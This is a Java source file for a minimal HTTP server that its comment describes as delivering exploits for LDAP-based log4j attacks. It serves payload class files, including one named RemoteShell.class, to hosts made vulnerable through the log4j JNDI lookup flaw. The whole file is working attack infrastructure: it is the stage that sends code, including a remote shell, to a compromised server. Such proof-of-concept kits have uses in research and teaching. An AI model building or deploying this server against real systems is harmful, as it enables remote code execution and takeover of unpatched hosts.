import static java.util.Optional.ofNullable;
import static java.util.logging.Level.INFO;
import static java.util.logging.Level.WARNING;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Arrays;
import java.util.List;
import java.util.logging.Logger;

/**
 * Very simple HTTP server for delivering exploits for LDAP based log4j attacks.
 */
public class ExploitServer {

    private static List<String> enabled_exploits = Arrays.asList("/OpenWebPage.class", "/RemoteShell.class");
    private static Logger logger = Logger.getLogger("ExploitServer");

    public ExploitServer(InetSocketAddress listeningAddress) throws IOException {
        final HttpServer httpServer = HttpServer.create(listeningAddress, 0);
        httpServer.createContext("/", ExploitServer::handle);

        logger.log(INFO, "Exploit server listening on {0}:{1,number,#####}", new Object[] {httpServer.getAddress().getHostName(), httpServer.getAddress().getPort()});

        httpServer.start();
    }

    /**
     * Will handle a http request and if it is a request for one of the accepted exploits, the
     * payload will be returned as a byte array.
     *
     * @param exchange incoming request.
     */
    private static void handle(HttpExchange exchange) {
        try {
            final String path = exchange.getRequestURI().getPath();

            if (enabled_exploits.contains(path)) {
                logger.log(INFO, "-> {0}", path);
                byte[] exploitPayload = toByteArray(path);
                exchange.sendResponseHeaders(200, exploitPayload.length);
                final OutputStream responseBody = exchange.getResponseBody();
                responseBody.write(exploitPayload);
                responseBody.close();
            } else {
                logger.log(INFO, "Unexpected exploit.");
            }
        } catch (Exception e) {
            logger.log(WARNING, "Unable to handle request.", e);
        }
    }

    /**
     * Will attempt to read a class and return it as a byte array.
     *
     * @param className Class to load.
     * @return Loaded class as bytes.
     * @throws IOException If the class could not be loaded
     */
    private static byte[] toByteArray(final String className) throws IOException {
        try (InputStream source = ofNullable(ExploitServerApp.class.getResourceAsStream(className)).orElseThrow(IOException::new)) {
            final byte[] exploit = new byte[source.available()];
            new DataInputStream(source).readFully(exploit);
            return exploit;
        }
    }

}
